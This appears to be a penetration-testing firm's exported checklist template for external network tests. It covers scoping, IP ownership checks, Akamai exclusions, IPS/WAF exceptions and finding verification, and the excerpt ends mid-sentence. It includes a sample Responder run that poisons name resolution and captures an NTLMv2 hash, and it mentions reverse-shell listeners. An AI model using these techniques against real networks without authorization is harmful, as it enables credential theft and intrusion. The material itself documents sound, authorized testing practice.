[
	{
		"uid": "82b4c5fe-54e3-4e8e-9b95-74a2fe73d36d",
		"name": "NetPen - External Network Penetration Test (ExPen) - Primary",
		"categories": [
			{
				"uid": "1b1bcf6b-5888-46d6-b9cb-b46ddca9cd44",
				"name": "Project Issues",
				"description": "",
				"type": 1,
				"tasks": [],
				"ordinal": 0,
				"collapsed": true
			},
			{
				"uid": "ce571a2b-a717-4067-ae28-7572b4c0dc3e",
				"name": "Project Setup",
				"description": "The goal of this group of tasks is to record the project information to help ensure the execution matches what was done during the project kickoff.",
				"type": 1,
				"tasks": [
					{
						"uid": "8e51e53a-94d9-4fa4-a1cf-c14e6d7935f4",
						"name": "Verify Project Type",
						"instructions": "<h2>Background Information</h2><p>Setting the correct Project Type for a project drives important functionality, such as finding severity overrides and project-specific checklists. The Project Type must be set correctly prior to beginning work on the engagement so that Platform can apply the correct customizations to the checklist and workspace.</p><h2><strong>Instructions</strong></h2><ol><li><p>Click the \"Overview\" tab in the Platform project.</p></li><li><p>Review the \"Project Type\" field in the \"Overview\" sidebar on the right side of the screen. If the field is already set to \"External Penetration Test (ExPen:Attack),\" then this task is complete and the remaining steps can be skipped. If the field is not set to \"External Penetration Test (ExPen:Attack),\" click the field and continue to the next step.</p></li><li><p>Select the \"External Penetration Test (ExPen:Attack)\" project type from the dropdown menu.</p></li><li><p>Click the \"Update Project\" button.</p></li><li><p>An \"Edit Project Info\" box may appear. If so, only select the \"Project Severities\" checkbox. The checklist will be configured in another task, so the \"Project Checklists\" checkbox can be left unselected. Note that by selecting the \"Project Severities\" checkbox, the severities of any existing findings in the workspace may change based on the new project type's severity override settings for those findings.</p></li><li><p>Click \"Update Project.\"</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "91709e50-5d4f-4de8-8b24-9e4a2ec2413f",
						"name": "Import Latest Checklist",
						"instructions": "<h2>Background Information</h2><p>When a Platform project is created with a specific project type defined, it will automatically add corresponding checklists to the project. This may occur days, weeks, or even months before the engagement's actual start date. If changes are made to the checklist template between the time it was added to the project and the time the engagement starts, the project checklist may not contain the latest information. Checklists that have been added to projects are not dynamically updated when the checklist template changes. In order to make sure the latest checklist template is added to the project, please follow the instructions below at the very beginning of any engagement:</p><h2>Instructions</h2><h3>Remove the Current Checklists (if any are present):</h3><ol><li><p>Click the \"Checklist\" tab in the Platform project.</p></li><li><p>In the Checklist screen, click the \"three-dot\" button on the right side of the screen.</p></li><li><p>Click \"Manage Checklist Templates\" in the dropdown menu screen that opens.</p></li><li><p>Page through the checklist templates and uncheck any that are currently selected.</p></li><li><p>Click the \"Add to Checklist\" button in the upper right corner of the screen.</p></li><li><p>Click \"Delete Checklists\" on the confirmation screen that opens. Note that any data in your current checklist will be deleted.</p></li></ol><h3>Add the Latest Checklist:</h3><ol><li><p>In the Checklist screen, click the \"three-dot\" button on the right side of the screen.</p></li><li><p>Click \"Manage Checklist Templates\" in the dropdown menu screen that opens.</p></li><li><p>In the search box, search for \"ExPen\"</p></li><li><p>Select the \"NetPen - External Network Penetration Test (ExPen) - Primary\" checklist.</p></li><li><p>Click the \"Add to Checklist\" button in the upper right corner of the screen.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "524476a9-4c2e-433b-a7e4-9022889291ba",
						"name": "Review Kickoff Tab Information",
						"instructions": "<h2>Background Information</h2><p>The Kickoff tab captures important information about the engagement, such as its scope, rules of engagement, contact emails/phone numbers, project timelines, and project-specific notes. This information should be thoroughly reviewed for accuracy and completeness prior to starting any engagement.</p><h2><strong>Instructions</strong></h2><ol><li><p>Click the \"Kickoff\" tab in the Platform project. The CDM should create the Kickoff document and fill in the appropriate information during the kickoff call.</p></li><li><p>Verify that the CDM has accurately filled out each section of the Kickoff tab and that any project-specific information noted during the kickoff call is included where applicable. \"Project-specific information\" could be specific time windows for testing, customized rules of engagements, or unique reporting requirements, for example.</p></li><li><p><strong>Here is what to review in each Kickoff tab section:</strong></p><ol><li><p><strong><em>Objectives/Scope:</em></strong> Ensure scope is accurate and well-documented. There should normally be information defining how many assets are in scope for discovery scanning, how many assets are in scope for testing, testing time windows, and deliverable expectations.</p></li><li><p><strong><em>Rules of Engagement:</em></strong> Understand the rules of engagement and review them for anything non-standard.</p></li><li><p><strong><em>Requirements:</em></strong> Confirm that the client has provided all required task items to NetSPI, and that NetSPI has completed any tasks we're responsible for.</p></li><li><p><strong><em>Communication and Escalation Procedures:</em></strong> Confirm that at least one client contact with a name, email address, and phone number has been entered into the contact tree. Confirm that all NetSPI contact information is complete and correct. NetSPI escalation contacts will typically be the consultant, the CDM, the account manager, and typically a manager within the project management organization (PMO) (in that order).</p></li><li><p><strong><em>Project Timeline:</em></strong> Confirm that all relevant dates have been entered into this section and align with client expectations.</p></li><li><p><strong><em>Notes:</em></strong> CDMs will sometimes capture client-specific or project-specific notes here. Review any additional notes related to the project.</p></li></ol></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7b805bd9-1723-484a-b406-76f49fcaa71e",
						"name": "Verify Project Timeline",
						"instructions": "<h2>Background Information</h2><p>The Kickoff tab stores the project timeline for the engagement. It is important to verify that the project milestone dates are accurate so that testing, QA, report delivery, and remediation testing are all executed according to the agreed-upon timeline.</p><h2><strong>Instructions</strong></h2><ol><li><p>Click the \"Kickoff\" tab in the Platform project.</p></li><li><p>Click on the \"Project Timeline\" section using the sidebar on the left side of the screen.</p></li><li><p><strong>Verify the following date fields:</strong></p><ol><li><p><strong>Testing and verification</strong> (Project start and completion date)</p></li><li><p><strong>Delivery of report to &lt;client&gt;</strong> (Report due date)</p></li><li><p><strong>Report Review Meeting</strong> (if applicable)</p></li><li><p><strong>Remediation Expiration Date</strong></p></li></ol></li><li><p>If any of the above fields are not set or have incorrect values, contact the CDM to confirm the timeline and have them corrected.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3f4dc978-df1c-483c-aee7-e4d24a153f0c",
						"name": "Review Client Specific Instructions",
						"instructions": "<h2>Background Information</h2><p>Some clients have specific processes, testing requirements, or reporting guidelines that need to be followed. Prior to starting the engagement, the wiki page noted below should be reviewed to determine if any client specific instructions need to be followed.</p><h2><strong>Instructions</strong></h2><p>Review the following Outline page for any client specific instructions that need to be followed during the engagement:</p><p><a href='https://outline.netspi.com/doc/client-specific-instructions-M3qxSwumJR'>https://outline.netspi.com/doc/client-specific-instructions-M3qxSwumJR</a></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "254deee9-bbe3-4263-8280-97ad8eeafb5e",
						"name": "Confirm IPS/WAF Exceptions",
						"instructions": "<h2>Background Information</h2><p>As part of the standard kickoff requirements, NetSPI requests that clients add NetSPI source IPs into any IPS or WAF devices they own that might interfere with testing. Generally speaking, these devices can automatically block NetSPI's IP addresses, thus causing testing delays while the blocks are removed. IPS and WAF devices can be standalone devices or appliances that are in place on the client network, they can be part of a router, or they can also be embedded into various cloud or CDN provider platforms. Most of the time, clients are able to find a way to add these exclusions to their devices to allow NetSPI to perform the automated scanning without getting blocked. It is important to get a verbal (or preferably written) confirmation from the client that these exceptions have been put into place prior to the start of testing. Do not assume exceptions are in place without getting the client's explicit confirmation.</p><h2><strong>Instructions</strong></h2><ol><li><p>Contact the client via Platform to obtain written confirmation that IPS/WAF exceptions have been applied. Add the client's confirmation message to this checklist task as a comment.</p></li><li><p>If the client is choosing to not add such exceptions for testing, add a comment to this checklist task indicating so. Don't forget to also adjust the report after generation to indicate that the client did not create exceptions.</p></li></ol><p><strong>NOTE:</strong> It is important to distinguish between allowing NetSPI through the firewall and allowing NetSPI through the IPS/WAF devices. We do not want to see any additional ports a normal internet attacker can't see. When performing initial testing, pay attention to which types of open ports you're seeing. If you're seeing certain ports that are typically only accessible internally, such as TCP/111, TCP/139, TCP/445 or TCP/3389, there is a strong chance the the client incorrectly put NetSPI's IP addresses into their firewall's allowlist, causing NetSPI to see ports that aren't typically exposed to the internet. Remember, we only want to avoid IPS/WAF devices so we don't get blocked, but we don't want to see anything that a normal attacker can't see.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d2d4220a-9924-4bcf-b230-0e0e62c1266a",
						"name": "Confirm NetSPI IP Address Sources are Used",
						"instructions": "<h2><strong>Background Information</strong></h2><p>Testing should only be conducted from NetSPI-managed hardware and infrastructure hosted on NetSPI-allocated IP addresses. This ensures that any testing traffic seen by a client can easily be attributed to NetSPI via IP address ownership checking. NetSPI's current set of source IP addresses can always be found at the allowlist URL (netspi.com/allowlist). </p><p>A typical testing platform will be a Linux (normally Kali) and/or Windows VM that are allocated to the consultant in NetSPI's vSphere infrastructure. Unless otherwise directed, all testing should occur using these VMs or the shared PENTEST HOST VMs if external out-of-band communication is required from a client target. Testing directly from the consultant's laptop is currently discouraged, and will be prohibited at a future undetermined date.</p><h2><strong>Instructions</strong> (vSPhere Consultant VMs)</h2><ol><li><p>If you do not have a Linux and Windows VM allocated to you, please file an IT support ticket to obtain them.</p></li><li><p>Conduct all testing from allocated testing VMs or the PENTEST HOST VMs.</p></li><li><p><strong>Do not use personal or cloud machines such as EC2 servers to handle out-of-band communication</strong> with a target, listen for reverse shells, or receive sensitive data. Only use the PENTEST HOST VMs for that.</p></li><li><p>Consultant VMs on the vSphere infrastructure cannot be accessed from the internet.</p></li><li><p>To obtain the IP address of your VM(s), log in to the vSphere console using the reference link below.</p></li></ol><h2>Instructions (PENTEST HOST VMs)</h2><ol><li><p>These VMs are used for things like out-of-band communication, receiving reverse shells or callbacks, or hosting malicious files for exploitation purposes.</p></li><li><p>Information on using these VMs can be found in the reference links below.</p></li><li><p>Passwords for these VMs are stored in PasswordState.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ade9d081-f8aa-42aa-990a-60cc6339bdc1",
						"name": "Organize Provided In-Scope IPs and URLs [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>For most engagements, the client will supply a list of in-scope IP addresses and/or URLs to target. The formats of these lists will vary greatly from client to client and may contain single IPs, IP ranges, CIDRs, and domain names. Sometimes the data will need to be organized and normalized for consumption.</p><h2>Instructions</h2><ol><li><p>Collect all of the provided IP addresses, IP ranges, and CIDRs provided by the client. Manually consolidate them as best as possible into a single list, removing any abnormal whitespace or unwanted formatting.</p></li><li><p>Expand, sort, and deduplicate the list of in-scope IPs, saving the results to a text file that can be used during the engagement. See the variations below for sample commands.</p></li><li><p>If domains were provided, a simple list of deduplicated domains can be created in addition to the list of IP addresses.</p></li></ol><h2>Variation: mapcidr</h2><h3>Install</h3><pre><code>$ go install -v github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest</code></pre><h3>Execution Example</h3><pre><code><strong><em>### List of provided in-scope IPs, IP ranges, and CIDRs\n</em>$ cat scope.txt</strong>\n192.168.1.1\n192.168.1.2-192.168.1.3\n192.168.1.4/30\n\n<strong><em>### Expand, sort, and deduplicate IPs, then save to a text file\n</em>$ cat scope.txt | mapcidr -silent -s | sort -u &gt; in-scope-ips.txt\n\n$ cat in-scope-ips.txt</strong>\n192.168.1.1\n192.168.1.2\n192.168.1.3\n192.168.1.4\n192.168.1.5\n192.168.1.6\n192.168.1.7</code></pre><h2>Variation: nmap</h2><h3>Install</h3><pre><code><strong><em>### Installed by default in Kali, but if not:</em></strong>\n$ sudo apt install nmap</code></pre><p>Other OS instructions and binaries can be found here:</p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://nmap.org/download.html\">https://nmap.org/download.html</a></p><h3>Execution Example</h3><pre><code><strong><em>### List of provided in-scope IPs, IP ranges, and CIDRs\n</em>$ cat ips.txt</strong>\n192.168.1.1\n192.168.1.2-3\n192.168.1.4/30\n\n<strong><em>## Expand, sort, and deduplicate IPs, then save to a text file\n</em>$ nmap -sL -Pn -n -iL scope.txt | awk '{print $5}' | grep -v \"address\" | grep -v \"nmap\" | sort | uniq &gt; in-scope-ips.txt\n\n$ cat in-scope-ips.txt</strong>\n192.168.1.1\n192.168.1.2\n192.168.1.3\n192.168.1.4\n192.168.1.5\n192.168.1.6\n192.168.1.7</code></pre><h2>Completion Requirements</h2><ol><li><p>If the organized, deduplicated list of in-scope IPs and URLs that was created is reasonably small, you may choose to paste it into a comment on this checklist task. If the list is unreasonably large for a comment or is being included as part of a master spreadsheet for the engagement, upload the list to the Internal Documents tab of the project.</p></li><li><p>If the list is uploaded to the Internal Documents tab, update this checklist task with a reference to the uploaded file.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "31483341-48b9-49c2-ac1d-372ee197d55b",
						"name": "Verify Client Owns the Provided IPs [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>Checking ownership information for the IPs and URLs supplied by the client is extremely important prior to performing any testing. NetSPI has a responsibility to perform reasonable due-diligence in order to ensure that we're only testing assets that are owned or controlled by the client. By checking IP and URL ownership information prior to testing, we can identify assets that might not belong to the client, assets that are part of a cloud provider's network, assets that are hosted on a third-party SaaS platform, or assets are hosted by a CDN. This information becomes important since NetSPI may not have permission to test such assets without additional approvals from the owners of the underlying infrastructure.</p><p>As a general rule of thumb, the following assets are <strong>OK</strong> to test against:</p><ul><li><p>assets with WHOIS records that clearly indicate client ownership</p></li><li><p>assets with WHOIS records that indicate ownership by a business-class ISP (Verizon Business, Comcast Business, etc.)</p></li><li><p>assets with WHOIS records that indicate ownership by a datacenter or web hosting provider (GoDaddy, Rackspace, etc.)</p></li><li><p>assets with WHOIS records that point to ownership by major cloud providers such as Azure, AWS, and GCP</p></li></ul><p>As a general rule of thumb, the following assets are <strong>NOT OK</strong> to test against without additional approval and/or allowlisting from the owner:</p><ul><li><p>assets with WHOIS records that indicate ownership by a third-party SaaS platform (Salesforce, WPEngine, Shopify, etc.)</p></li><li><p>assets with WHOIS records that indicate ownership by Akamai</p></li></ul><p>Additional information may be used to help determine asset ownership when the WHOIS record information does not explicitly tie back to the client, including reviewing exposed web applications, SSL certificates, reverse DNS records, or getting explicit confirmation from the client.</p><p>Third-party platforms will generally have their own policies governing penetration testing, which are sometimes published in their Terms of Service (TOS) or Acceptable Use Policy (AUP) documentation online. If unsure, speak with the client to confirm that they obtained approval from the asset owner regarding the scheduled penetration test and that we're operating within the expected terms set by the third-party.</p><p>The major cloud providers such as AWS, Azure, and GCP do not generally require explicit permission to test, but do have some limitations in terms of which services can be tested and which types of testing can be performed. More information can be found in the Reference Links for this checklist item</p><h2>Instructions</h2><ol><li><p>Using the list of IPs obtained in the previous checklist item (Organize Provided In-Scope IPs and URLs), use one of the variations below to obtain IP ownership information for each IP.</p></li><li><p>For URLs supplied by the client, first resolve the domain name to an IP address (or addresses) before using the tools outlined in the variations below.</p></li></ol><h2>Variation: ipwho (Recommended)</h2><h3>Install Requirements</h3><ol><li><p>Download from GitHub Repository: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/OSINT/tree/master/IPOwnership/ipwho\">https://github.com/NetSPI/OSINT/tree/master/IPOwnership/ipwho</a></p></li><li><p>Install requirements:</p></li></ol><pre><code>$ python3 -m pip install -r requirements.txt</code></pre><h3>Execution Example</h3><pre><code><strong>$ cat in-scope-ips.txt</strong>\n38.32.141.184\n38.32.141.185\n38.32.141.186\n38.32.141.187\n38.32.141.188\n<strong>[TRUNCATED]\n\n$ python3 ipwho.py in-scope-ips.txt &lt;client&gt;-ip-ownership.csv</strong>\nProgress: 5/336\nProgress: 10/336\nProgress: 15/336\n<strong>[TRUNCATED]</strong></code></pre><h2>Variation: ipinfo</h2><p><strong>Note:</strong> For the ipinfo tool, an API key (the optional <code>-k</code> argument) is not required, however data is limited to 1000 requests (IPs) per day per source IP unless you provide an API key. Sign up for a free API key at <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://ipinfo.io/signup\">https://ipinfo.io/signup</a> to increase the limit to 50,000 requests (IPs) per month.</p><h3>Install Requirements</h3><ol><li><p>Download from GitHub Repository: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/OSINT/tree/master/IPOwnership/ipinfo\">https://github.com/NetSPI/OSINT/tree/master/IPOwnership/ipinfo</a></p></li><li><p>Install requirements:</p></li></ol><pre><code>$ python3 -m pip install dnspython</code></pre><h3>Execution Example</h3><pre><code><strong>$ cat in-scope-ips.txt</strong>\n38.32.141.184\n38.32.141.185\n38.32.141.186\n38.32.141.187\n38.32.141.188\n<strong>[TRUNCATED]\n\n$ python ipinfo.py -f in-scope-ips.txt -o &lt;client&gt;-ip-ownership.csv [-k &lt;APIKey&gt;]</strong>\n (_)_ __ (_)_ __  / _| ___  (_) ___\n | | '_ \\| | '_ \\| |_ / _ \\ | |/ _ \\\n | | |_) | | | | |  _| (_) || | (_) |\n |_| .__/|_|_| |_|_|  \\___(_)_|\\___/\n\nStatus: [336/336]\nData written to &lt;client&gt;-ip-ownership.csv</code></pre><h2>Variation: Get-ArinLookup.ps1</h2><p><strong>Note:</strong> Due to rate limiting enforced by the particular API service used in this script, it is very slow. Only use this as a last resort.</p><h3>Install Requirements</h3><ol><li><p>Download from GitHub Repository: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/OSINT/tree/master/IPOwnership/Arin\">https://github.com/NetSPI/OSINT/tree/master/IPOwnership/Arin</a></p></li><li><p>Modify the following lines of code in the script to reference the input file containing the IPs to check and the path to save the CSV output to:</p></li></ol><pre><code># Get list of networks\n$MyIPs = gc <span style=\"color: rgb(219, 39, 25)\"><strong>C:\\temp\\networks.txt</strong></span>\n\n# Output file name for CSV\n$MyCSV = \"<span style=\"color: rgb(219, 39, 25)\"><strong>C:\\temp\\Arin-results.csv</strong></span>\"</code></pre><h3>Execution Example</h3><pre><code><strong>PS C:\\tools\\GitHub\\NetSPI\\OSINT\\IPOwnership\\Arin&gt; type in-scope-ips.txt</strong>\n38.32.141.184\n38.32.141.185\n38.32.141.186\n38.32.141.187\n38.32.141.188\n<strong>[TRUNCATED]\n\nPS C:\\tools\\GitHub\\NetSPI\\OSINT\\IPOwnership\\Arin&gt; .\\Get-ArinLookup.ps1</strong>\nDest: Src:38.32.141.184 Owner: COGENT-A () (38.0.0.0 -38.255.255.255)\nDest: Src:38.32.141.185 Owner: COGENT-A () (38.0.0.0 -38.255.255.255)\nDest: Src:38.32.141.186 Owner: COGENT-A () (38.0.0.0 -38.255.255.255)\n<strong>[TRUNCATED]</strong></code></pre><h2>Completion Requirements</h2><ol><li><p>Review the ownership information to identify any assets that aren't owned by the client or are hosted by third-party entities.</p></li><li><p>Perform further investigation of those assets to determine if they can be included in the testing scope based on the information described in the \"Background Information\" section of this checklist item.</p></li><li><p>Upload the IP ownership CSV output to the Internal Documents tab in Platform.</p></li><li><p>Alternatively, if a master spreadsheet file is being maintained for the project, copy the ownership information into a clearly labeled sheet in that document and upload it to the Internal Documents tab once the project is completed.</p></li><li><p>Add a comment to this checklist task with a reference to the uploaded file.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d3a78466-bfc4-42a9-bcb2-d629b91f3883",
						"name": "Confirm NO Akamai IPs are In Scope [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>Akamai is a CDN provider that is commonly observed during external penetration tests. They tend to host websites for larger organizations that require geolocated servers and web application firewall (WAF) protections for their hosted applications.</p><p>Akamai maintains an IP reputation database that their clients can leverage to determine if incoming traffic from specific source IPs is potentially malicious and automatically block it. When penetration testing traffic coming from NetSPI's source IPs is flagged as malicious by Akamai, our source IPs receive can receive a bad reputation score and be blocked across the entire Akamai ecosystem. This results in our inability to access many clients who leverage Akamai's IP reputation scoring system, not just the client we're performing the testing on.</p><p>Because of this, we generally don't permit the testing of Akamai-hosted assets. However, if the client provides a confirmation that an AkaTec ticket outlining the penetration testing details has been filed and acknowledge by Akamai, we may choose to conduct testing on those assets at the discretion of the consultant and service lead. From Akamai's documentation (referenced in the Reference links for this checklist item):</p><blockquote><p>A penetration testing firm should ask a customer on the Akamai Intelligence Platform to provide Akamai with an explicit consent (in advance of the relevant test attack activity) to ignore any attack traffic to the customer’s applications from a specified penetration testing firm.</p></blockquote><blockquote><p>Akamai customers that have a legal agreement in place with a penetration testing company and wish to submit a request to ignore attack traffic to their applications from that company should open an AkaTec ticket. The ticket should include information on the IP addresses that will be used for such attacks. Once a ticket is received by Akamai, Akamai will ignore any future attack traffic from the provided IP addresses to the customer’s applications in the Akamai’s reputation services.</p></blockquote><h2>Instructions</h2><ol><li><p>Review the IP/domain ownership information that was collected in the previous checklist step (&quot;Verify Client Owns the Provided IPs&quot;).</p></li><li><p>Review the ASN description, Organization description, and Network Name values for references to Akamai. Additionally, the article referenced in the Reference links for this checklist item contains the current list of Akamai IP ranges, which can be cross-referenced with the data obtained from the IP ownership checks if necessary.</p></li><li><p>If any Akamai references are found, remove those IPs and corresponding domains from the list of in-scope assets.</p></li><li><p>Contact the client via Resolve and provide them with a list of the Akamai assets. Ask them if they have filed an AkaTec ticket with the appropriate information referenced in the quote above and the links below and received an acknowledgement from Akamai. If so, have them provide the AkaTec reference/ticket number and add it to this checklist item as a comment and add the assets back into the in-scope IP/domain list.</p></li><li><p>If the client has not opened an AkaTec ticket that has been acknowledged by Akamai, or if they are choosing not to seek exceptions from Akamai for the testing, inform them that that we will be unable to test the Akamai-hosted assets. If the client is choosing to not add such exceptions for testing, add a comment to this checklist task indicating so.</p></li><li><p>When generating the report, don't forget to remove the Akamai-hosted assets from the In-Scope Assets appendix at the end of the report.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d7229a29-a6cb-4205-8bff-0a1a73bf8aa2",
						"name": "Review Previously Identified Critical/High Findings",
						"instructions": "<h2>Background Information</h2><p>If previous penetration tests against the same (or at least some of the same) assets have been performed, the reported findings should be reviewed to determine if they still exist. If they still exist, the can be reported again in the current test. This helps create consistency across multi-year testing scenarios to ensure that a finding was reported on a previous test and wasn't fixed doesn't get overlooked in the current test. Previous Critical (especially those labeled as entry points) and High severity findings should be reviewed, along with any worthwhile Medium severity findings if time permits.</p><h2>Instructions</h2><ol><li><p>Contact the CDM and ask them to provide you with access to all previous ExPen projects conducted for the client.</p></li><li><p>Review the client's previous ExPen projects and determine if previously identified Critical (especially entry points) or High severity findings still exist. Worthwhile Medium severity findings, such as exposed administrative login portals, should also be reviewed if time permits.</p></li><li><p>If the previous findings are still valid, add them to the current workspace and create new verification steps.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 10,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cc0aebfa-ac4e-4d86-bc21-68d43014cb41",
						"name": "Change Project Status to \"In Progress\"",
						"instructions": "<h2>Background Information</h2><p>Updating the project status is visible to the client in Platform and lets them know which stage of the engagement we're currently in.</p><h2><strong>Instructions</strong></h2><ol><li><p>In the Platform project, click the colored status at the top of the screen, which is likely currently set to \"New\".</p></li><li><p>Click \"In Progress\" to change the project state.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 11,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 1,
				"collapsed": true
			},
			{
				"uid": "51aad5c3-e1b9-4a94-bc4c-a25047c96738",
				"name": "Project Objectives",
				"description": "Project objectives for external network penetration tests.",
				"type": 1,
				"tasks": [
					{
						"uid": "c7a08966-31c1-4cf9-b249-a7eb7c754f00",
						"name": "Complete All Required Tasks",
						"instructions": "<h2>Instructions</h2><ul><li><p>Complete all tasks not labeled as \"[OPTIONAL]\" or in a \"[OPTIONS]\" task category.</p></li><li><p>All tasks labeled with \"[ASM]\" should be automatically completed by the standard \"External Penetration Test\" workflow in ASM. Once the ASM scan is complete, these items can be marked as complete in the checklist. You do not have to execute them manually.</p></li><li><p>All tasks labeled with \"[Internal Documents]\" require the task-related output to be uploaded to the Internal Documents section of the Platform project.</p></li><li><p>All tasks labeled with \"[External Documents]\" require the task-related output to be organized and uploaded to the Documents section of Platform in the form of a client deliverable.</p></li><li><p>For all high severity vulnerabilities, attempt to drive exploitation to command execution where possible for the sample verification.</p></li><li><p>If internal network access is obtained, only one full domain escalation path showing impact is required for the attack narrative.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ef7d2b88-a336-4205-ac53-dff2ab6a06c8",
						"name": "Adhere to Verification Guidelines",
						"instructions": "<h2>Instructions</h2><h3>General Guidance</h3><p>1. All findings should be verified for accuracy; however, only Medium and above severity findings need to have least one verification item each.</p><p>2. While not required, it is encouraged to also provide verification items for Low severity findings as time permits. This is especially true if the report contains a small number of findings.</p><p>3. All findings marked as False Positive should have a verification explaining why it was marked FP. This helps the QAer and other consultants quickly understand what is happening.</p><h3></h3><h3>Building Finding Verifications</h3><p>1. Each scenario and escalation path should have a separate verification for each step.</p><p>2. Each title should begin with a prefix (domain name, IP address, asset tag, etc.), be a complete sentence, and include a description of the step taken. Ensure relevant usernames, systems, tools, and OS are mentioned in the description where applicable. Any tool that is not installed by default on Windows or Kali should have a link to the tool within the relevant verification. When multiple verifications are used, only the first title needs a prefix and OS. Subsequent verifications only need this information if the tool, OS, or IP changes between verifications.</p><p><strong>2a. Example of first verification item's </strong><strong><em>Name</em></strong><strong> field:</strong></p><blockquote><p>netspi.local: Using the tool Responder, it was possible to spoof LLMNR, NBNS and MDNS requests to create a man-in-the-middle and capture hashed user passwords.</p></blockquote><p><strong>2b. Example of first verification item's </strong><strong><em>Description</em></strong><strong> field:</strong></p><pre><code><strong>$ sudo responder -I eth0\n\n</strong><strong>[TRUNCATED]</strong>\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.64 for name PC12 (service: File Server)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.64 for name netspi.local (service: Domain Master Browser)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n[&#42;] [NBT-NS] Poisoned answer sent to 192.168.185.89 for name PC-02 (service: Workstation/Redirector)\n<strong><span style=\"color: #DB2719\">[&#42;] [MDNS] Poisoned answer sent to ::ffff:172.16.60.171 for name netspi.local\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Client   : ::ffff:172.16.60.171\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Username : netspi\\test.user\n</span></strong><strong><span style=\"color: #DB2719\">[SMB] NTLMv2-SSP Hash     : test.user::netspi:</span></strong><strong>[REDACTED]\n</strong><strong>[TRUNCATED]</strong></code></pre><p>3. Ensure each critical finding is pushed to command execution whenever possible.</p><p>4. If you cannot exploit a critical vulnerability due to lack of exploit, availability concerns, or other reasons, please note that in the verification so the client has that context. The finding should still be verified where possible via non-intrusive means, e.g. version headers, info disclosure, etc.</p><p><strong>4a. Example of verification item's </strong><strong><em>Name</em></strong><strong> field for a Critical vulnerability that can't be exploited (modify as needed to provide the correct context/rationale for not performing the exploitation):</strong></p><blockquote><p>192.168.1.1: This finding has been included as the result of automated scanning. At this time, exploit code has been published but was not executed as a part of this assessment due to availability concerns.</p></blockquote><p>5. If the finding results in direct unauthenticated read, write, or command execution on the target system, please mark the finding as an &quot;Entry Point.&quot; This should include all weak and default password findings.</p><p>6. Rating adjustments must be approved by service lead, POD lead, or Director.</p><p>7. If there is an &quot;Unedited Master Finding&quot; in your workspace, it may need to be adjusted or rewritten for your instance. Make sure these are pointed out to the POD lead and/or QA resource by leaving an untracked (&quot;hidden&quot;) comment in Resolve, a comment in your report, and/or messaging them directly on Slack. They may also 